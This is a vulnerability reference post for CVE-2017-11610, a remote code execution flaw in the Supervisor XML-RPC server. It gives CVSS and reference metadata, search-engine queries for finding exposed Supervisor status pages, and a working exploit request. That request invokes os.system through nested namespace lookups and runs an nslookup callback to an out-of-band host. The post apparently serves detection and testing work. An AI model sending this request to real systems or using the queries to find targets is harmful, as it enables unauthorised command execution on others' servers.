---
layout: post
cve_id: CVE-2017-11610
title: XML-RPC Server - Remote Code Execution
pcap: true
pcap_path: /pcaps/2017/CVE-2017-11610.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-11610.yaml
snort2_rule: N/A
snort3_rule: N/A
author: notnotnotveg
severity: high
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the target system.

  '
remediation: 'Apply the latest security patches or disable the XML-RPC server if not
  required.

  '
reference:
- https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/supervisor_xmlrpc_exec.md
- https://nvd.nist.gov/vuln/detail/CVE-2017-11610
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JXGWOJNSWWK2TTWQJZJUP66FLFIWDMBQ/
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DTPDZV4ZRICDYAYZVUHSYZAYDLRMG2IM/
- http://www.debian.org/security/2017/dsa-3942
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2017-11610
  cwe-id: CWE-276
  epss-score: 0.93776
  epss-percentile: 0.99843
  cpe: cpe:2.3:a:supervisord:supervisor:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: supervisord
  product: supervisor
  shodan-query:
  - http.title:"Supervisor Status"
  - http.title:"supervisor status"
  fofa-query: title="supervisor status"
  google-query: intitle:"supervisor status"
tags:
- cve2017
- cve
- oast
- xmlrpc
- msf
- rce
- supervisor
- supervisord
- vkev
- vuln
---

## üîç Vulnerability Description
The XML-RPC server in supervisor before 3.0.1, 3.1.x before 3.1.4, 3.2.x before 3.2.4, and 3.3.x before 3.3.3 allows remote authenticated users to execute arbitrary commands via a crafted XML-RPC request, related to nested supervisor namespace lookups.

## üåê HTTP Request
```nohighlight
POST /RPC2 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Connection: close
Content-Length: 244
Accept: text/xml
Content-type: text/xml
Accept-Encoding: gzip

<methodCall>
  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
  <params>
    <param>
      <string>nslookup d5jq73ple0o4li36fc1g7ny9p7oxur5d9.oast.live</string>
    </param>
  </params>
</methodCall>
```

